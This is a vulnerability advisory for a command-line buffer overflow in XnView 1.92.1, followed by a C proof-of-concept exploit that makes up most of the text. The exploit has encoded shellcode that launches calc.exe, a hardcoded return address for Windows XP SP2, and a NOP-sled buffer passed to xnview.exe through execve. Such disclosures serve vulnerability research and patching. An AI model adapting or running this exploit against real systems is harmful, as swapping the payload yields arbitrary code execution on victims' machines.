source: http://www.securityfocus.com/bid/28259/info

XnView is prone to a buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.

Attackers may exploit this issue only if XnView is configured as a handler for other applications, so that it can be passed malicious filenames as command-line data.

An attacker can exploit this issue to execute arbitrary code in the context of the user running the affected application. Failed exploit attempts will result in a denial of service.

This issue affects XnView 1.92.1; other versions may also be vulnerable.

#include <unistd.h>  

/*
Shellcode
Size=164 octets
Action: open calc.exe
*/
unsigned char shellcode[] =
"\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x16"
"\x77\x0b\x94\x83\xeb\xfc\xe2\xf4\xea\x9f\x4f\x94\x16\x77\x80\xd1"
"\x2a\xfc\x77\x91\x6e\x76\xe4\x1f\x59\x6f\x80\xcb\x36\x76\xe0\xdd"
"\x9d\x43\x80\x95\xf8\x46\xcb\x0d\xba\xf3\xcb\xe0\x11\xb6\xc1\x99"
"\x17\xb5\xe0\x60\x2d\x23\x2f\x90\x63\x92\x80\xcb\x32\x76\xe0\xf2"
"\x9d\x7b\x40\x1f\x49\x6b\x0a\x7f\x9d\x6b\x80\x95\xfd\xfe\x57\xb0"
"\x12\xb4\x3a\x54\x72\xfc\x4b\xa4\x93\xb7\x73\x98\x9d\x37\x07\x1f"
"\x66\x6b\xa6\x1f\x7e\x7f\xe0\x9d\x9d\xf7\xbb\x94\x16\x77\x80\xfc"
"\x2a\x28\x3a\x62\x76\x21\x82\x6c\x95\xb7\x70\xc4\x7e\x87\x81\x90"
"\x49\x1f\x93\x6a\x9c\x79\x5c\x6b\xf1\x14\x6a\xf8\x75\x59\x6e\xec"
"\x73\x77\x0b\x94";

/*
user32.dll ret adress ==> jmp ebp
under Win XP pro SP2
*/
unsigned char ret[] ="\x34\x59\x40\x7e";


int main(int argc,char *argv[]){
char *bufExe[3];
char buf[511];
bufExe[0] = "xnview.exe";
bufExe[2] = NULL;
memset(buf,0x90,511);
memcpy(&buf[260],ret,4);   
memcpy(&buf[330],shellcode,sizeof(shellcode));   
bufExe[1] = buf;

execve(bufExe[0],bufExe,NULL);
return 0x0;
}